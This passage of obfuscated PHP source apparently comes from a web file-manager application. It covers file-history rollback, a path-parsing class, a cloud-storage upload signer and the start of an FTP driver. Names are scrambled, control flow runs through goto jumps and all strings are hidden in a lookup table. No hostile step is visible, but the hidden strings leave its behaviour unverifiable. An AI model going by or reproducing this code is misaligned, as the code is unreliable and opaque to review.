F²Ò…ÙøãŒ; d‰¦ï¶»ï: $Bİ—´äØ®à = $a³‚ïËÃŸ[1091]; $f—‚‰º¢š¬ = $f—‚‰º¢š¬ ? $f—‚‰º¢š¬ : get_path_this($EÅ¦³èÛš‚); $dµŒÈ‹İÜ = $dµŒÈ‹İÜ ? $dµŒÈ‹İÜ : $B“›°ßŞ²¬[$a³‚ïËÃŸ[1103]]; goto d°ìã£Ñ½È; F²Ò…ÙøãŒ: } public static function rollback($aÜÌğ³®’, $bÉ¯‘¯´Ë‚) { $fİË¼•ˆÈ£ =& $_SERVER[Â€Á›¨õ]; $eõ„™ÃÚ× = self::listData($aÜÌğ³®’); if (!$eõ„™ÃÚ×) { return; } $e¯ˆòæŸàÇ = IO::info($aÜÌğ³®’); foreach ($eõ„™ÃÚ×[$fİË¼•ˆÈ£[365]] as $B‡µßİ«‘ => $bŠñ“Š„…) { if ($bŠñ“Š„…[$fİË¼•ˆÈ£[388]] == $bÉ¯‘¯´Ë‚) { self::add($aÜÌğ³®’); $EİÙ‚±£˜ = $eõ„™ÃÚ×[$fİË¼•ˆÈ£[1103]] . $bŠñ“Š„…[$fİË¼•ˆÈ£[28]]; $f†™ŸíÆÇ¾ = IO::copy($EİÙ‚±£˜, IO::pathFather($aÜÌğ³®’), REPEAT_REPLACE, $e¯ˆòæŸàÇ[$fİË¼•ˆÈ£[28]]); if ($f†™ŸíÆÇ¾) { self::remove($aÜÌğ³®’, $bÉ¯‘¯´Ë‚); } return $f†™ŸíÆÇ¾; } } return !1; } public static function setDetail($bÃ¢Óˆç¹, $bøÈ«…˜ø¶, $cÌ¿Å¼ö¡) { $bŞ¦ºÒªÙ =& $_SERVER[Â€Á›¨õ]; $FÁÙšÈ‘ß‹ = self::listData($bÃ¢Óˆç¹); if (!$FÁÙšÈ‘ß‹) { return; } foreach ($FÁÙšÈ‘ß‹[$bŞ¦ºÒªÙ[365]] as $Dæ”‰ºàŠÉ => $aŒëØÊøô´) { if ($aŒëØÊøô´[$bŞ¦ºÒªÙ[388]] == $bøÈ«…˜ø¶) { $FÁÙšÈ‘ß‹[$bŞ¦ºÒªÙ[365]][$Dæ”‰ºàŠÉ][$bŞ¦ºÒªÙ[1102]] = $cÌ¿Å¼ö¡; self::saveData($FÁÙšÈ‘ß‹[$bŞ¦ºÒªÙ[1104]], $FÁÙšÈ‘ß‹[$bŞ¦ºÒªÙ[365]]); return !0; } } return !1; } public static function fileInfo($Eğ±Ì§áƒ, $BöÒØ’©–£) { goto E§‚ùùŠÔ¶; a¥³ÚŒç: return IO::info($DËò–ƒ”); goto Cä’¦ÉäãÉ; E§‚ùùŠÔ¶: $f—í»ƒÜ…“ =& $_SERVER[Â€Á›¨õ]; $E„­¼Â˜å = self::listData($Eğ±Ì§áƒ); if (!$E„­¼Â˜å) { show_json(LNG($f—í»ƒÜ…“[104]), !1); } goto c…Ñğ–Â; c…Ñğ–Â: $DËò–ƒ” = $f—í»ƒÜ…“[33]; foreach ($E„­¼Â˜å[$f—í»ƒÜ…“[365]] as $CŠ…‚ÕÇ„î => $BÒä÷í¸²Ü) { if ($BÒä÷í¸²Ü[$f—í»ƒÜ…“[388]] != $BöÒØ’©–£) { continue; } $DËò–ƒ” = $E„­¼Â˜å[$f—í»ƒÜ…“[1103]] . $BÒä÷í¸²Ü[$f—í»ƒÜ…“[28]]; break; } if (!$DËò–ƒ”) { show_json(LNG($f—í»ƒÜ…“[104]), !1); } goto a¥³ÚŒç; Cä’¦ÉäãÉ: } public static function fileOut($f©¾èÒÃ¬ó, $eÒ¿Œø·ƒ, $c°“Ğ«‚¼ = false) { $D—†—ØÛÃ =& $_SERVER[Â€Á›¨õ]; $CÉÆÕ°”½Í = self::fileInfo($f©¾èÒÃ¬ó, $eÒ¿Œø·ƒ); $BÈ²‡ =& $GLOBALS[$D—†—ØÛÃ[7]]; $c°“Ğ«‚¼ = isset($BÈ²‡[$D—†—ØÛÃ[1068]]) && $BÈ²‡[$D—†—ØÛÃ[1068]] == 1; if (isset($BÈ²‡[$D—†—ØÛÃ[29]]) && $BÈ²‡[$D—†—ØÛÃ[29]] == $D—†—ØÛÃ[1105]) { return IO::fileOutImage($CÉÆÕ°”½Í[$D—†—ØÛÃ[75]], $BÈ²‡[$D—†—ØÛÃ[1106]]); } IO::fileOut($CÉÆÕ°”½Í[$D—†—ØÛÃ[75]], $c°“Ğ«‚¼, get_path_this($f©¾èÒÃ¬ó)); } public static function listData($cššƒÃË², $FÔÇ¦Åƒß† = true) { goto DÎŞ³‘õô‘; c÷Õ—‚÷: $B·ô«„áÂ = IO::getContent($Ağ¾‚ˆÉÒ[$FË¨ìÑõ¬Š[1104]]); if ($B·ô«„áÂ) { $AÍ‘Áå†åŒ = json_decode($B·ô«„áÂ, !0); if (is_array($AÍ‘Áå†åŒ)) { $Ağ¾‚ˆÉÒ[$FË¨ìÑõ¬Š[365]] = $AÍ‘Áå†åŒ; } } return $Ağ¾‚ˆÉÒ; goto d‡å‘ìåÔå; DÎŞ³‘õô‘: $FË¨ìÑõ¬Š =& $_SERVER[Â€Á›¨õ]; if ($FÔÇ¦Åƒß† && !IO::exist($cššƒÃË²)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto E„·…³ù°Ô; E„·…³ù°Ô: if (substr($cššƒÃË², 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $cÆÍš¡äé = self::pathHistory($cššƒÃË²); $Ağ¾‚ˆÉÒ = array($FË¨ìÑõ¬Š[1104] => $cÆÍš¡äé . $FË¨ìÑõ¬Š[1091], $FË¨ìÑõ¬Š[1103] => rtrim(get_path_father($cÆÍš¡äé), $FË¨ìÑõ¬Š[8]) . $FË¨ìÑõ¬Š[8], $FË¨ìÑõ¬Š[365] => array()); goto c÷Õ—‚÷; d‡å‘ìåÔå: } private static function saveData($f–Œ¥„çÁİ, $fË”Ö³¢Ñ) { goto CìÊóÂÚ£; A¬×ùÏ½¥è: $aç˜ğÌ‘ÆŒ = IO::pathFather($f–Œ¥„çÁİ); IO::remove($f–Œ¥„çÁİ); self::clearEmptyFolder($aç˜ğÌ‘ÆŒ); goto a¢¨ÜÊßøÛ; CìÊóÂÚ£: $A²ƒ–Êò†æ =& $_SERVER[Â€Á›¨õ]; self::log($A²ƒ–Êò†æ[1107] . $f–Œ¥„çÁİ . $A²ƒ–Êò†æ[67] . count($fË”Ö³¢Ñ), $A²ƒ–Êò†æ[704]); if ($fË”Ö³¢Ñ) { return IO::setContent($f–Œ¥„çÁİ, json_encode($fË”Ö³¢Ñ)); } goto A¬×ùÏ½¥è; a¢¨ÜÊßøÛ: return !0; goto f„×Ï·«½; f„×Ï·«½: } public static function clearEmptyFolder($FîÊƒÈÃ‚ä) { goto dÓùÊî…¢à; Aäã¬…Ç: self::clearEmptyFolder($aÒ’°ˆ÷í×); goto c¶´²È‹Ğ¾; dÓùÊî…¢à: $dŸ¥––Í‹ê =& $_SERVER[Â€Á›¨õ]; if (trim($FîÊƒÈÃ‚ä, $dŸ¥––Í‹ê[8]) == trim(self::$_historyBase, $dŸ¥––Í‹ê[8])) { return; } $aÒ’°ˆ÷í× = IO::pathFather($FîÊƒÈÃ‚ä); goto CÒ£÷¯Å; CÒ£÷¯Å: $A¾…·¸Ø¼ = IO::has($FîÊƒÈÃ‚ä, !0); if ($A¾…·¸Ø¼[$dŸ¥––Í‹ê[201]] > 0 || $A¾…·¸Ø¼[$dŸ¥––Í‹ê[202]] > 0) { return; } IO::remove($FîÊƒÈÃ‚ä); goto Aäã¬…Ç; c¶´²È‹Ğ¾: } private static function getBasePath() { goto E…öÌÜä…; E…öÌÜä…: $CÉøŸ„¨äç =& $_SERVER[Â€Á›¨õ]; $Aç«×Í³‚ = Model($CÉøŸ„¨äç[1108])->get($CÉøŸ„¨äç[1109]); if (IO::exist($Aç«×Í³‚)) { return $Aç«×Í³‚; } goto DŒ¿Ô‘á–; DŒ¿Ô‘á–: $Aç«×Í³‚ = DATA_PATH . $CÉøŸ„¨äç[1110]; $Aç«×Í³‚ = IO::mkdir($Aç«×Í³‚); $Aç«×Í³‚ = rtrim($Aç«×Í³‚, $CÉøŸ„¨äç[8]) . $CÉøŸ„¨äç[8]; goto ağÜ¼£×ô; ağÜ¼£×ô: file_put_contents($Aç«×Í³‚ . $CÉøŸ„¨äç[1111], $CÉøŸ„¨äç[33]); Model($CÉøŸ„¨äç[1108])->set($CÉøŸ„¨äç[1109], $Aç«×Í³‚); return $Aç«×Í³‚; goto BÛÜ†ºÍ; BÛÜ†ºÍ: } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\122\x65\143\171\x63\154\145\175"; const KOD_USER_FAV = "\173\x75\163\145\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\151\154\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\x72\106\x69\154\x65\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\160\122\x6f\157\164\x53\145\154\146\175"; const KOD_USER_SHARE = "\x7b\165\163\145\162\123\150\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\150\x61\162\145\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\x49\x74\x65\155\x4c\151\156\x6b\175"; const KOD_SEARCH = "\173\163\145\141\162\143\150\x7d"; const KOD_BLOCK = "\173\142\x6c\157\143\153\175"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\145\x6e\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\162\x7d"; public static function typeList() { $d‰óĞ°ù­¸ =& $_SERVER[Â€Á›¨õ]; return array($d‰óĞ°ù­¸[1112] => self::KOD_SOURCE, $d‰óĞ°ù­¸[1113] => self::KOD_USER_RECYCLE, $d‰óĞ°ù­¸[1114] => self::KOD_USER_FAV, $d‰óĞ°ù­¸[1115] => self::KOD_USER_FILE_TAG, $d‰óĞ°ù­¸[1116] => self::KOD_USER_FILE_TYPE, $d‰óĞ°ù­¸[1117] => self::KOD_GROUP_ROOT_SELF, $d‰óĞ°ù­¸[1118] => self::KOD_USER_SHARE, $d‰óĞ°ù­¸[1119] => self::KOD_USER_SHARE_LINK, $d‰óĞ°ù­¸[1120] => self::KOD_USER_SHARE_TO_ME, $d‰óĞ°ù­¸[1121] => self::KOD_SHARE_ITEM, $d‰óĞ°ù­¸[1122] => self::KOD_SHARE_LINK, $d‰óĞ°ù­¸[1123] => self::KOD_SEARCH, $d‰óĞ°ù­¸[1124] => self::KOD_BLOCK, $d‰óĞ°ù­¸[1125] => self::KOD_IO, $d‰óĞ°ù­¸[1126] => self::KOD_USER_RECENT, $d‰óĞ°ù­¸[1127] => self::KOD_USER_DRIVER); } public static function parse($f‘°ÔÙ¿êÖ) { goto fĞ½ÚæÙÙê; dÌÀ›‘À×: $bøÓÇ—›”Ñ = array($D™ì¹Çš¡‚[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $cØÕã†Øæë[$D™ì¹Çš¡‚[1093]] = in_array($cØÕã†Øæë[$D™ì¹Çš¡‚[29]], $bøÓÇ—›”Ñ); return $cØÕã†Øæë; goto cğ†Ûõäƒµ; DÉØØÈ×Ğ×: preg_match($D™ì¹Çš¡‚[1128], $f‘°ÔÙ¿êÖ, $cßò««„Øˆ); $cØÕã†Øæë = array($D™ì¹Çš¡‚[409] => !1, $D™ì¹Çš¡‚[1129] => !1, $D™ì¹Çš¡‚[406] => !1, $D™ì¹Çš¡‚[75] => $f‘°ÔÙ¿êÖ, $D™ì¹Çš¡‚[1039] => !1, $D™ì¹Çš¡‚[1038] => $D™ì¹Çš¡‚[33]); if (is_array($cßò««„Øˆ) && count($cßò««„Øˆ) == 5) { $CÊîàÌ¡–î = $D™ì¹Çš¡‚[1130] . $cßò««„Øˆ[2] . $D™ì¹Çš¡‚[323]; if (in_array($CÊîàÌ¡–î, $cÌãôñ‘ù)) { $cØÕã†Øæë[$D™ì¹Çš¡‚[1039]] = $cßò««„Øˆ[1]; $cØÕã†Øæë[$D™ì¹Çš¡‚[29]] = $CÊîàÌ¡–î; $cØÕã†Øæë[$D™ì¹Çš¡‚[1131]] = substr($CÊîàÌ¡–î, 1, -1); $cØÕã†Øæë[$D™ì¹Çš¡‚[388]] = $cßò««„Øˆ[3]; } $cØÕã†Øæë[$D™ì¹Çš¡‚[1038]] = $cßò««„Øˆ[4]; } goto dÌÀ›‘À×; fĞ½ÚæÙÙê: $D™ì¹Çš¡‚ =& $_SERVER[Â€Á›¨õ]; $f‘°ÔÙ¿êÖ = self::clear($f‘°ÔÙ¿êÖ); $cÌãôñ‘ù = array_values(self::typeList()); goto DÉØØÈ×Ğ×; cğ†Ûõäƒµ: } public static function isTruePath($Fƒê˜âÀä) { goto E¼­Æ´Ÿº¿; E¼­Æ´Ÿº¿: $b‰ ÉÜ—×ê =& $_SERVER[Â€Á›¨õ]; if (substr($Fƒê˜âÀä, 0, 1) != $b‰ ÉÜ—×ê[1130]) { return !0; } if (strpos($Fƒê˜âÀä, $b‰ ÉÜ—×ê[395]) === 0) { return !0; } goto a´èÒİëŞ; a´èÒİëŞ: if (strpos($Fƒê˜âÀä, $b‰ ÉÜ—×ê[1096]) === 0) { return !0; } if (strpos($Fƒê˜âÀä, $b‰ ÉÜ—×ê[1132]) === 0) { return !0; } if (strpos($Fƒê˜âÀä, $b‰ ÉÜ—×ê[1132]) === 0) { return !0; } goto D¿ñ¥ÍíñÆ; D¿ñ¥ÍíñÆ: if (strpos($Fƒê˜âÀä, $b‰ ÉÜ—×ê[1133]) === 0) { return !0; } return !1; goto b¢À¶¦É¥¼; b¢À¶¦É¥¼: } public static function clear($c•«†Í„Ê) { goto dö³•ñ±ƒò; aÔ˜ğáèÏË: $c•«†Í„Ê = preg_replace($bâæ´à¡½“[1136], $bâæ´à¡½“[8], $c•«†Í„Ê); if ($c•«†Í„Ê == $bâæ´à¡½“[8]) { return $bâæ´à¡½“[8]; } $c•«†Í„Ê = rtrim($c•«†Í„Ê, $bâæ´à¡½“[8]); goto EÙâÌñî›î; dö³•ñ±ƒò: $bâæ´à¡½“ =& $_SERVER[Â€Á›¨õ]; $c•«†Í„Ê = str_replace(array($bâæ´à¡½“[1012], $bâæ´à¡½“[227]), $bâæ´à¡½“[50], $c•«†Í„Ê); $c•«†Í„Ê = str_replace($bâæ´à¡½“[96], $bâæ´à¡½“[8], $c•«†Í„Ê); goto D¼è·ÖÇÙ; EÙâÌñî›î: return $c•«†Í„Ê; goto Eøƒ¬‡¼à‘; D¼è·ÖÇÙ: $C°œƒ¤Óì = $bâæ´à¡½“[1134]; if (substr($c•«†Í„Ê, 0, 3) == $bâæ´à¡½“[1135]) { $c•«†Í„Ê = substr($c•«†Í„Ê, 3); } while (strstr($c•«†Í„Ê, $C°œƒ¤Óì)) { $c•«†Í„Ê = str_replace($C°œƒ¤Óì, $bâæ´à¡½“[8], $c•«†Í„Ê); } goto aÔ˜ğáèÏË; Eøƒ¬‡¼à‘: } public static function sourceID($dÛ¤²íˆö) { $Bçâ‘Ú¢åÃ =& $_SERVER[Â€Á›¨õ]; $aßÓğù•ê = self::parse($dÛ¤²íˆö); if ($aßÓğù•ê[$Bçâ‘Ú¢åÃ[29]] !== self::KOD_SOURCE) { show_json(LNG($Bçâ‘Ú¢åÃ[1137]), !1); } return $aßÓğù•ê[$Bçâ‘Ú¢åÃ[388]]; } public static function make($bòô…„îõÂ) { if (!$bòô…„îõÂ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bòô…„îõÂ)); } public static function makeShare($aØÜ•ñ¿Ò, $FÎè¨ƒ•»È) { return self::makePath(self::KOD_SHARE_ITEM, $aØÜ•ñ¿Ò, $FÎè¨ƒ•»È); } public static function makeFileTypePath($BÅÎé˜ŠÃ) { return self::makePath(self::KOD_USER_FILE_TYPE, $BÅÎé˜ŠÃ); } public static function makeFileTagPath($C¨ÙÇéä”) { return self::makePath(self::KOD_USER_FILE_TAG, $C¨ÙÇéä”); } public static function makePath($b¦™Ÿ‰§ƒ™, $aÇšã•“ˆÈ = '', $BÄç•ëµ³› = '') { $CÄší¦ƒ‡± =& $_SERVER[Â€Á›¨õ]; $eâ£åÍ„ß® = substr($b¦™Ÿ‰§ƒ™, 1, -1); $A‡ˆ–Œš½Ü = $CÄší¦ƒ‡±[1138] . $eâ£åÍ„ß® . $CÄší¦ƒ‡±[1139] . $aÇšã•“ˆÈ . $CÄší¦ƒ‡±[1140]; $A‡ˆ–Œš½Ü = $BÄç•ëµ³› ? $A‡ˆ–Œš½Ü . $BÄç•ëµ³› . $CÄší¦ƒ‡±[8] : $A‡ˆ–Œš½Ü; return $A‡ˆ–Œš½Ü; } public static function hashPath($A¦öÏÑİ¢) { $f²óÊÊ”Ä =& $_SERVER[Â€Á›¨õ]; $d®™±Ğ¿í“ = is_array($A¦öÏÑİ¢) ? $A¦öÏÑİ¢ : IO::info($A¦öÏÑİ¢); $F ‚ŠƒÓ ó = _get($d®™±Ğ¿í“, $f²óÊÊ”Ä[1141], $f²óÊÊ”Ä[33]); if (!$F ‚ŠƒÓ ó) { $câçÛµğš” = KodIO::parse($d®™±Ğ¿í“[$f²óÊÊ”Ä[75]]); if (!$câçÛµğš”[$f²óÊÊ”Ä[29]]) { $F ‚ŠƒÓ ó = IO::hashSimple($d®™±Ğ¿í“[$f²óÊÊ”Ä[75]]); } } if (!$F ‚ŠƒÓ ó) { $F ‚ŠƒÓ ó = md5($d®™±Ğ¿í“[$f²óÊÊ”Ä[75]] . $d®™±Ğ¿í“[$f²óÊÊ”Ä[77]] . $d®™±Ğ¿í“[$f²óÊÊ”Ä[83]]); } return $F ‚ŠƒÓ ó; } public static function initSystemPath() { goto AŠÔß¼½ˆ÷; a§ÁóŠ…›: IOHistory::bindEvent(); goto aÂÛìÙ›Õß; AŠÔß¼½ˆ÷: $C‘ã½ÑÃ­Ô =& $_SERVER[Â€Á›¨õ]; if (defined($C‘ã½ÑÃ­Ô[1142])) { return; } define($C‘ã½ÑÃ­Ô[1142], self::systemPath($C‘ã½ÑÃ­Ô[1143])); goto F«—‚ÉóÕ¹; F«—‚ÉóÕ¹: define($C‘ã½ÑÃ­Ô[1144], self::systemPath($C‘ã½ÑÃ­Ô[1145])); define($C‘ã½ÑÃ­Ô[1146], self::systemPath($C‘ã½ÑÃ­Ô[1147])); define($C‘ã½ÑÃ­Ô[1148], self::systemPath($C‘ã½ÑÃ­Ô[1149])); goto a§ÁóŠ…›; aÂÛìÙ›Õß: } public static function systemPath($Dì¥ˆœ ‹¢) { goto A´¯ “èÊ; A´¯ “èÊ: $fÌ›Ü®îô® =& $_SERVER[Â€Á›¨õ]; $C·“ ª²± = $fÌ›Ü®îô®[1150] . ucfirst($Dì¥ˆœ ‹¢); $c˜Ï…Å = Model($fÌ›Ü®îô®[1098])->get($C·“ ª²±); goto B¦Õ©“ôá“; B¦Õ©“ôá“: if ($c˜Ï…Å) { return $c˜Ï…Å; } if ($Dì¥ˆœ ‹¢ == $fÌ›Ü®îô®[1143]) { $c˜Ï…Å = self::make(Model($fÌ›Ü®îô®[767])->systemRootPathAdd($fÌ›Ü®îô®[500])); } else { $c˜Ï…Å = self::systemPath($fÌ›Ü®îô®[1143]); $dÌ‹—ßÒÓÙ = self::sourceID($c˜Ï…Å); $c˜Ï…Å = self::make(Model($fÌ›Ü®îô®[767])->mkdir($dÌ‹—ßÒÓÙ, $Dì¥ˆœ ‹¢)); } Model($fÌ›Ü®îô®[1098])->set($C·“ ª²±, $c˜Ï…Å); goto F²½î†‰Ü; F²½î†‰Ü: return $c˜Ï…Å; goto D×ë¡åÛÁ; D×ë¡åÛÁ: } public static function systemFolder($e¥ù³º›à) { $D¼ŒâÛøğ¡ = IO_PATH_SYSTEM_SOURCE . $e¥ù³º›à; $c–ÜìöÒ¬ = Cache::get($D¼ŒâÛøğ¡); if (!$c–ÜìöÒ¬) { $a—´³¨¬õ¾ = IO::infoFull($D¼ŒâÛøğ¡); if (!$a—´³¨¬õ¾) { $c–ÜìöÒ¬ = IO::mkdir($D¼ŒâÛøğ¡, REPEAT_SKIP); } else { $c–ÜìöÒ¬ = $a—´³¨¬õ¾[$_SERVER[Â€Á›¨õ][75]]; } Cache::set($D¼ŒâÛøğ¡, $c–ÜìöÒ¬, 3600 * 10); } return $c–ÜìöÒ¬; } public static function defaultDriver() { return Model($_SERVER[Â€Á›¨õ][716])->defaultDriver(); } public static function defaultIO() { $E Üò±Öì =& $_SERVER[Â€Á›¨õ]; $c”““‰ÃˆŒ = self::defaultDriver(); return $E Üò±Öì[1151] . $c”““‰ÃˆŒ[$E Üò±Öì[388]] . $E Üò±Öì[1140]; } public static function defaultDriverInit() { static $Dí¨´µ¹˜‹ = false; if ($Dí¨´µ¹˜‹) { return $Dí¨´µ¹˜‹; } $Dí¨´µ¹˜‹ = IO::init(self::defaultIO()); return $Dí¨´µ¹˜‹; } public static function fileTypeList() { $d„¨ÃÃæ¶Œ =& $_SERVER[Â€Á›¨õ]; $dÎõÆÙµ„ = $GLOBALS[$d„¨ÃÃæ¶Œ[6]][$d„¨ÃÃæ¶Œ[1152]]; foreach ($dÎõÆÙµ„ as $C„îŠÊ‡Õµ => $dµœô™É) { $FÄ‰éç«ìÀ = $d„¨ÃÃæ¶Œ[1153] . $C„îŠÊ‡Õµ; $dÆÒİÀãËê = LNG($FÄ‰éç«ìÀ); if ($FÄ‰éç«ìÀ != $dÆÒİÀãËê) { $dÎõÆÙµ„[$C„îŠÊ‡Õµ][$d„¨ÃÃæ¶Œ[28]] = $dÆÒİÀãËê; } } return $dÎõÆÙµ„; } public static function transferType($c™ë•Øö„Œ, $e¯èâšÕÉ) { goto f¬¡¨‰İ¾‚; C¤šÉÌº—: if ($E¢Š˜¶ˆÇÓ[$D…Ã÷µ¿“×[29]] == $EØİåŠ—™[$D…Ã÷µ¿“×[29]] && $E¢Š˜¶ˆÇÓ[$D…Ã÷µ¿“×[1154]] == $EØİåŠ—™[$D…Ã÷µ¿“×[1154]]) { return $D…Ã÷µ¿“×[1155]; } if ($E¢Š˜¶ˆÇÓ[$D…Ã÷µ¿“×[29]] == $D…Ã÷µ¿“×[800] && $EØİåŠ—™[$D…Ã÷µ¿“×[29]] == $D…Ã÷µ¿“×[105]) { return $D…Ã÷µ¿“×[1068]; } if ($E¢Š˜¶ˆÇÓ[$D…Ã÷µ¿“×[29]] == $D…Ã÷µ¿“×[105] && $EØİåŠ—™[$D…Ã÷µ¿“×[29]] == $D…Ã÷µ¿“×[800]) { return $D…Ã÷µ¿“×[106]; } goto D¥ßóï‹ù‡; f¬¡¨‰İ¾‚: $D…Ã÷µ¿“× =& $_SERVER[Â€Á›¨õ]; $E¢Š˜¶ˆÇÓ = self::driverType($c™ë•Øö„Œ); $EØİåŠ—™ = self::driverType($e¯èâšÕÉ); goto C¤šÉÌº—; D¥ßóï‹ù‡: return $D…Ã÷µ¿“×[1156]; goto Dë¿„õ‚Ï¹; Dë¿„õ‚Ï¹: } public static function driverType($dóÜÒòó) { goto b³Æ’í¥¾š; d÷½…·Åù: if ($d…¢®¢÷ùÛ == $E’¸â·™òÑ[707] || $d…¢®¢÷ùÛ == $E’¸â·™òÑ[1158] || $d…¢®¢÷ùÛ == $E’¸â·™òÑ[1159]) { $dóÜÒòó = self::defaultDriverInit(); } else { if ($d…¢®¢÷ùÛ == $E’¸â·™òÑ[1075] || $d…¢®¢÷ùÛ == $E’¸â·™òÑ[1160]) { $dóÜÒòó = IO::init($dóÜÒòó->pathParse[$E’¸â·™òÑ[1022]]); } } $d…¢®¢÷ùÛ = str_replace($E’¸â·™òÑ[1157], $E’¸â·™òÑ[33], strtolower($dóÜÒòó->getType())); if ($d…¢®¢÷ùÛ == $E’¸â·™òÑ[105]) { return array($E’¸â·™òÑ[29] => $E’¸â·™òÑ[105], $E’¸â·™òÑ[1154] => $E’¸â·™òÑ[33], $E’¸â·™òÑ[75] => $e£‘óÖŠ); } goto bó­¦İæ‘; b³Æ’í¥¾š: $E’¸â·™òÑ =& $_SERVER[Â€Á›¨õ]; $e£‘óÖŠ = $dóÜÒòó->path; $d…¢®¢÷ùÛ = str_replace($E’¸â·™òÑ[1157], $E’¸â·™òÑ[33], strtolower($dóÜÒòó->getType())); goto d÷½…·Åù; bó­¦İæ‘: return array($E’¸â·™òÑ[29] => $E’¸â·™òÑ[800], $E’¸â·™òÑ[1154] => $dóÜÒòó->pathDriver, $E’¸â·™òÑ[75] => $e£‘óÖŠ); goto DÈ‚¿ê¯Éí; DÈ‚¿ê¯Éí: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($a³÷ĞªÍ†) { parent::__construct($a³÷ĞªÍ†); $this->signatureVersion($_SERVER[Â€Á›¨õ][210]); } public function uploadFormData($CÉÔÛÚÈñŠ, $eƒÌÔ‡°øø = 3600) { goto Eò²ƒ¨Š»‚; f´µÓ“ôò—: $dÃƒ‹§«­ = array($bä‚ïğ¤Æ½[1163] => $dÑ­½©ÕÄâ, $bä‚ïğ¤Æ½[1164] => array(array($bä‚ïğ¤Æ½[1165] => $FœÛ—•¡¸Ø), array($bä‚ïğ¤Æ½[1166] => $this->bucket), array($bä‚ïğ¤Æ½[1167], $bä‚ïğ¤Æ½[1168], $bä‚ïğ¤Æ½[33]), array($bä‚ïğ¤Æ½[1169] => $cĞÛè…‚”), array($bä‚ïğ¤Æ½[1170] => $bƒ ö‡¦‚Ù), array($bä‚ïğ¤Æ½[1171] => $this->accessKey), array($bä‚ïğ¤Æ½[1172] => $c¢ø²èÓØŞ))); $dÃƒ‹§«­ = json_encode($dÃƒ‹§«­); $Cù„Â•á’â = hash_hmac($bä‚ïğ¤Æ½[228], $c¢ø²èÓØŞ, $this->secret); goto B‡îÈŒ‡§Æ; fÎ‘óÏÒÃ: $cĞÛè…‚” = $bä‚ïğ¤Æ½[1161]; $dÑ­½©ÕÄâ = gmdate($bä‚ïğ¤Æ½[1162], time() + $eƒÌÔ‡°øø); $c¢ø²èÓØŞ = (string) time() . $bä‚ïğ¤Æ½[67] . (string) (time() + $eƒÌÔ‡°øø); goto f´µÓ“ôò—; Eò²ƒ¨Š»‚: $bä‚ïğ¤Æ½ =& $_SERVER[Â€Á›¨õ]; $FœÛ—•¡¸Ø = $bä‚ïğ¤Æ½[191]; $bƒ ö‡¦‚Ù = $bä‚ïğ¤Æ½[228]; goto fÎ‘óÏÒÃ; B‡îÈŒ‡§Æ: $Fâµ¶Ûøëó = sha1($dÃƒ‹§«­); $E¢±¤ÙÒ»ˆ = hash_hmac($bä‚ïğ¤Æ½[228], $Fâµ¶Ûøëó, $Cù„Â•á’â); $C‡ó„ç¹£ = array($bä‚ïğ¤Æ½[1165] => $FœÛ—•¡¸Ø, $bä‚ïğ¤Æ½[1169] => $cĞÛè…‚”, $bä‚ïğ¤Æ½[1173] => base64_encode($dÃƒ‹§«­), $bä‚ïğ¤Æ½[1170] => $bƒ ö‡¦‚Ù, $bä‚ïğ¤Æ½[1171] => $this->accessKey, $bä‚ïğ¤Æ½[1174] => $c¢ø²èÓØŞ, $bä‚ïğ¤Æ½[1175] => $E¢±¤ÙÒ»ˆ, $bä‚ïğ¤Æ½[175] => $this->getHost()); goto A£ß†±ØÉ; A£ß†±ØÉ: return $C‡ó„ç¹£; goto aë¾µß…–Ş; aë¾µß…–Ş: } public function fileOutLink($CËÖ…””¹) { $eç…Ä´Ã¤‚ =& $_SERVER[Â€Á›¨õ]; if (substr($CËÖ…””¹, 0, 7) == $eç…Ä´Ã¤‚[1176]) { $CËÖ…””¹ = $eç…Ä´Ã¤‚[1177] . substr($CËÖ…””¹, 7); } header($eç…Ä´Ã¤‚[158] . $CËÖ…””¹); die; } } goto BÑñ–ÎÙŠ; A‹áÀçÈº: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($fŸñ‡ˆ«Ç) { parent::__construct(); if (count($fŸñ‡ˆ«Ç) > 0) { $this->_init($fŸñ‡ˆ«Ç); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($AÌÚ•ºªù×) { $fÕÑŒñ¹ã =& $_SERVER[Â€Á›¨õ]; global $config; $this->appCharset = $config[$fÕÑŒñ¹ã[1213]]; $this->systemCharset = $config[$fÕÑŒñ¹ã[1214]]; if (isset($AÌÚ•ºªù×[$fÕÑŒñ¹ã[1215]]) && $AÌÚ•ºªù×[$fÕÑŒñ¹ã[1215]]) { $this->systemCharset = $AÌÚ•ºªù×[$fÕÑŒñ¹ã[1215]]; } } public function iconvApp($DÃ«Ó‚«Í›) { return $this->iconvTo($DÃ«Ó‚«Í›, $this->systemCharset, $this->appCharset); } public function iconvSystem($EÃ¬¿Ôí×–) { return $this->iconvTo($EÃ¬¿Ôí×–, $this->appCharset, $this->systemCharset); } public function getPathOuter($c†“ÜÒßã) { goto b‡á´Ï»ÊÆ; d‰œ¥Âœ²: $c†“ÜÒßã = KodIO::clear($c†“ÜÒßã); $c†“ÜÒßã = substr($c†“ÜÒßã, 